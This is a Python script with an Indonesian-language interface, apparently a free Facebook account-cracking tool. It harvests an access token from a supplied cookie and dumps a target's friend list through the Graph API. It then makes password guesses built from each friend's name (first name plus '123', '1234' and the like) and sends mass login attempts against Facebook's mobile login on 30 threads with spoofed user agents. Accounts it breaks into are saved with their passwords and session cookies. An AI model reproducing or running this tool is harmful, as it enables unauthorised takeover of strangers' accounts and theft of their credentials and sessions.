# -----------------[ IMPORT-MODULE ]-------------------
import requests,json,os,sys,random,datetime,time,re
from rich.console import Console as sol
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich import pretty

from rich.panel import Panel
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from rich.console import Console

try:
    import rich
except ImportError:
    cetak(nel("\t• Sedang Menginstall Modul Rich •"))
    os.system("pip install rich")

try:
    import requests
except ImportError:
    cetak(nel("\t• Sedang Menginstall Modul Requests •"))
    os.system("pip install requests && pip install mechanize ")
# ------------------[ USER-AGENT ]-------------------#
pretty.install()
CON = sol()
ugen = []
cokbrut = []
fields = []
ses = requests.Session()
princp = []
# ------------[ INDICATION ]---------------#
(
    id,
    id2,
    loop,
    ok,
    cp,
    akun,
    oprek,
    method,
    lisensiku,
    taplikasi,
    tokenku,
    uid,
    lisensikuni,
) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
cokbrut = []
pwpluss, pwnya = [], []

#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
asu = random.choice([m,h,u,b])
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
dic2 = {
    "01": "January",
    "02": "February",
    "03": "March",
    "04": "April",
    "05": "May",
    "06": "June",
    "07": "July",
    "08": "August",
    "09": "September",
    "10": "October",
    "11": "November",
    "12": "Devember",
}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"


# ------------------[ MACHINE-SUPPORT ]---------------#
def asepyusup(u):
    for e in u + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)
# ------------------[ LOGO-LAKNAT ]-----------------#
def loading():
    animation = [
        "[\x1b[1;91m■\x1b[0m□□□□□□□□□]",
        "[\x1b[1;92m■■\x1b[0m□□□□□□□□]",
        "[\x1b[1;93m■■■\x1b[0m□□□□□□□]",
        "[\x1b[1;94m■■■■\x1b[0m□□□□□□]",
        "[\x1b[1;95m■■■■■\x1b[0m□□□□□]",
        "[\x1b[1;96m■■■■■■\x1b[0m□□□□]",
        "[\x1b[1;97m■■■■■■■\x1b[0m□□□]",
        "[\x1b[1;98m■■■■■■■■\x1b[0m□□]",
        "[\x1b[1;99m■■■■■■■■■\x1b[0m□]",
        "[\x1b[1;910m■■■■■■■■■■\x1b[0m]",
    ]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(
            f"\r>> {H}Loading...{N} " + animation[i % len(animation)] + "\x1b[0m "
        )
        sys.stdout.flush()

def login():
	asep()
	Console(width=50, style="bold hot_pink2").print(Panel("[italic green]masukan cookie anda saran jangan pake akun pribadi[italic white]", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (MASUKAN COOKIE) [bold green]<[bold yellow]<[bold red]<"))
	cok = Console().input("[bold hot_pink2]   ╰─> ")
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Cookie Valid Silahkan cari cookies baru atu buat cookie Baru [italic white]", subtitle="", subtitle_align="left",));time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				exit(f"Token : {took} \ncookies aktif,jalankan ulang perintah nya dengan ketik python run.py")
	except Exception as e:exit(e)
# ------------------[ BAGIAN-MENU ]----------------#
def menu():
	os.system('cls' if os.name == 'nt' else 'clear')
	asep()
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		Console(width=50, style="bold hot_pink2").print(Panel("[italic green]cookie invalid [italic white]", subtitle="", subtitle_align="left",))
		time.sleep(2);os.system('cls' if os.name == 'nt' else 'clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\nTidak ada koneksi")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Kaya nya akun anda terkena cekpoin...! [italic white]", subtitle="", subtitle_align="left",))
		os.system('cls' if os.name == 'nt' else 'clear')
		login()
	Console(width=50, style="bold hot_pink2").print(Panel("[italic green]1.[italic white] Crack Publik \n[italic green]2.[italic white] Crack File \n[italic green]3.[italic white] Lapor Bug \n[italic green]0.[italic white] Keluar", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN MENU) [bold green]<[bold yellow]<[bold red]<"))
	asepyusup = Console().input("[bold hot_pink2]   ╰─> ")
	if asepyusup in ["1"]:
		Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Gunakan uid Publik,Jangan Perivat[italic white]", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (UID PUBLIK) [bold green]<[bold yellow]<[bold red]<"))
		idt = Console().input("[bold hot_pink2]   ╰─> ")
		dump(idt,"",{"cookie":cok},token)
		setting()
	elif asepyusup in ["2"]:
		crack_file()
	elif asepyusup in ["3"]:
		Gabung()
	elif asepyusup in ["0"]:
		os.system("rm -rf .tok.txt")
		os.system("rm -rf .cookie.txt")
		Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Sukses [italic white]", subtitle="", subtitle_align="left",))
	else:
		Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Pilih yang bener [italic white]", subtitle="", subtitle_align="left",))
		exit()

def Gabung():
    Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Tunggu Sedang Arah Kan ke Admin [italic white]", subtitle="", subtitle_align="left",))
    loading()
    os.system(
        "xdg-open https://www.facebook.com/zuck"
    )
    time.sleep(5)
    menu()


###-----[ DUMP PUBLIK ]-----###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r sedang dump... {len(id)}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
# -------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
    try:
        vin = os.listdir("dump/")
    except FileNotFoundError:
        Console(width=50, style="bold hot_pink2").print(Panel("[italic green]File Tidak Temukan [italic white]", subtitle="", subtitle_align="left",))
        time.sleep(2)
        exit()
    if len(vin) == 0:
        Console(width=50, style="bold hot_pink2").print(Panel("[italic green] BUAT DUMP DULU KETIK Y/T[italic white]", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (ASEP DUMP) [bold green]<[bold yellow]<[bold red]<"))
        kontol = Console().input("[bold hot_pink2]   ╰─> ")
        if kontol in [""]:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Pilih yang bener [italic white]", subtitle="", subtitle_align="left",))
        elif kontol in ["y", "Y"]:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Dump Dulu [italic white]", subtitle="", subtitle_align="left",))
            time.sleep(3)
            exit()
        elif kontol in ["t", "T"]:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Terserah lu ajah Bang [italic white]", subtitle="", subtitle_align="left",))
            time.sleep(3)
            exit()
        Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Anda Tidak Memilki File Dump [italic white]", subtitle="", subtitle_align="left",))
        time.sleep(2)
        exit()
    else:
        cih = 0
        lol = {}
        for isi in vin:
            try:
                hem = open("dump/" + isi, "r").readlines()
            except:
                continue
            cih += 1
            if cih < 100:
                nom = "" + str(cih)
                lol.update({str(cih): str(isi)})
                lol.update({nom: str(isi)})
                print(f"%s. %s ({h} %s{x} idz )" % (nom, isi, len(hem)))
            else:
                lol.update({str(cih): str(isi)})
                print(
                    "["
                    + str(cih)
                    + "] "
                    + isi
                    + " [ "
                    + str(len(hem))
                    + " Account ]"
                    + H )
                print(" %s. %s ({h} %s {x}idz) " % (cih, isi, len(hem)))
        geeh = input("\nPilih : ")
        try:
            geh = lol[geeh]
        except KeyError:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Pilih yang bener [italic white]", subtitle="", subtitle_align="left",))
            time.sleep(3)
            exit()
        try:
            lin = open("dump/" + geh, "r").read().splitlines()
        except:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Cek Aing Ge Dump Hela [italic white]", subtitle="", subtitle_align="left",))
            time.sleep(2)
            exit()
        for xid in lin:
            id.append(xid)
        setting()


# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    print("")
    Console(width=50, style="bold hot_pink2").print(Panel("[italic green]1.[italic white] Urutan Olid ke New \n[italic green]2.[italic white] Urutan New ke olid \n[italic green]3.[italic white] Random ", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN URUTAN) [bold green]<[bold yellow]<[bold red]<"))
    hu = Console().input("[bold hot_pink2]   ╰─> ")
    if hu in ["1", "01"]:
        for tua in sorted(id):
            id2.append(tua)

    elif hu in ["2", "02"]:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Pilih Yang Bener [italic white]", subtitle="", subtitle_align="left",))
        exit()
    Console(width=50, style="bold hot_pink2").print(Panel("[italic green]1.[italic white] Validate", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (BAGIAN METHODE) [bold green]<[bold yellow]<[bold red]<"))
    hc = Console().input("[bold hot_pink2]   ╰─> ")
    if hc in ["1", "01"]:
        method.append("async")
    elif hc in [""]:
        Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Pilih Yang Bener [italic white]", subtitle="", subtitle_align="left",))
        setting()
    else:
        method.append("async")
    Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Password Tambahan Pilih [italic green](Y atu T)[italic white]", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (PASSWORD) [bold green]<[bold yellow]<[bold red]<"))
    pwplus = Console().input("[bold hot_pink2]   ╰─> ")
    if pwplus in ["y", "Y"]:
        pwpluss.append("ya")
        Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Masukan kata sandi tambahan contoh [italic green]Bagong,Ngentod[italic white]\nSaran kata sandi daeraah Target Contoh [italic green]kalimantan,bandung,jonggol[italic white]", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (TAMBAHKAN PASSWORD) [bold green]<[bold yellow]<[bold red]<"))
        pwku = Console().input("[bold hot_pink2]   ╰─> ")
        pwkuh = pwku.split(",")
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append("no")
    passwrd()


# -------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
            frs = nmf.split(" ")[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(frs + "123")
                    pwv.append(frs + "1234")
                    pwv.append(frs + "12345")
                    pwv.append(frs + "123456")
                    pwv.append(frs + "321")
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append(frs + "123")
                    pwv.append(frs + "1234")
                    pwv.append(frs + "12345")
                    pwv.append(frs + "123456")
                    pwv.append(frs + "321")
            if "ya" in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:
                pass
            if "async" in method:
                pool.submit(crack, idf, pwv)
            else:
                pool.submit(crack, idf, pwv) 
                
    Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Crack Selesai [italic white]", subtitle="", subtitle_align="left",))
    print(f"[•] OK : %s " % (ok))
    print(f"[•] CP : %s " % (cp))
    print("")
    Console(width=50, style="bold hot_pink2").print(Panel("[italic green]Lanjut apa Udah ? Pilih (Y/T) [italic white]", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (SELESAI) [bold green]<[bold yellow]<[bold red]<"))
    woi = Console().input("[bold hot_pink2]   ╰─> ")
    if woi in ["y", "Y"]:
        exit()
    else:
        Console(width=50, style="bold hot_pink2").print(Panel("[italic green]love Sayangku [italic white]", subtitle="", subtitle_align="left",))
        time.sleep(2)
        exit()


def ua_valid():
	rr = random.randint
	rc = random.choice
	androversi = rc(["9","10","11","12","13"])
	mmk = random.choice(["7.1.2","9"])
	asus = random.choice(["SM-J120M","SM-N935F"])
	tecno1 = random.choice(["ru-ru","en-us","es-us","fr-fr","es-","pt-ao"])
	tecno2 = random.choice(["TECNO CD8","itel L6005","itel L6501","TECNO KE7","TECNO IN2","TECNO CD6j","TECNO BD2p","TECNO KD7h","TECNO LA7","itel W6004","MobiGo2","TECNO LC6","TECNO KB7j","itel S661W"])
	tecnobulid3 = random.choice(["QP1A.190711.020","PPR1.180610.011","RP1A.201005.001"])
	tecno4 = random.choice(["7.2","7.4","7.5","7.8","7.6-;","7.3","7.7"])
	tec = f"Mozilla/5.0 (Linux; Android {mmk}; {asus}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Safari/537.36"
	yo = f"Mozilla/5.0 (Linux; U; Android {androversi}; {tecno1}; {tecno2} Build/{tecnobulid3}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,105))}.0.{str(rr(1111,4444))}.{str(rr(45,250))} Mobile Safari/537.36 PHX/{tecno4}"
	yo1 = f"Mozilla/5.0 (Linux; U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(30,114))}.0.{str(rr(3000,5555))}.{str(rr(30,150))} Mobile Safari/537.36 (SmartTV/8.5) (NetCast) (Android)"
	return rc([tec,yo,yo1])
# --------------------[ METODE-MOBILE ]-----------------#
def crack(idf, pwv):
    global loop, ok, cp
    sys.stdout.write(f"\r╭─> {str(loop)}/{len(id2)} OK-:{ok} CP-:{cp}"),
    sys.stdout.flush()
    ses = requests.Session()
    ua = ua_valid()
    for pw in pwv:
        try:
            ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.facebook.com/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            link = ses.get(f"https://m.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
            data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": idf,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
            headd = {"Host": "m.prod.facebook.com","content-length": "666","cache-control": "max-age=0","dpr": "1.4375","viewport-width": "980","sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": '"Android"',"sec-ch-ua-platform-version": '"11.0.0"',"sec-ch-ua-model": '"RMX2195"',"sec-ch-ua-full-version-list": '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.43", "Google Chrome";v="120.0.6099.43"',"sec-ch-prefers-color-scheme": "dark","upgrade-insecure-requests": "1","origin": "https://m.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://m.prod.facebook.com/login/device-based/password/?uid=100075070896599&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
            post = ses.post("https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data,headers=headd,allow_redirects=False)
            if "checkpoint" in ses.cookies.get_dict().keys():
                tree = Tree("")
                tree.add(f"[bold red]uid : {idf}").add(f"[bold red]password : {pw}", style = "bold white")
                tree.add(f"[bold red]useragent : {ua}", style = "bold white")
                print(tree)
                open("CP/" + "ASEP-CP.txt", "a").write(idf + "|" + pw + "\n")
                akun.append(idf + "|" + pw)
                cp += 1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                tree = Tree("")
                tree.add(f"[bold green]uid : {idf}").add(f"[bold green]password : {pw}", style = "bold white")
                tree.add(f"[bold green]cookie : {kuki}", style = "bold white")
                print(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def asep():
    os.system('cls' if os.name == 'nt' else 'clear')
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●                               
 _____                __ __ _____             
|  _  |___ ___ ___   |  |  |  |  |___ _ _ ___ 
|     |_ -| -_| . |  |_   _|  |  |_ -| | | . |
|__|__|___|___|  _|    |_| |_____|___|___|  _|
              |_|                        |_|  

[bold blue]                SUKAMAKAMUR[bold blue]""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] SC GERATIS [bold green]<[bold yellow]<[bold red]<"))


# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass
    time.sleep(3)
    menu()
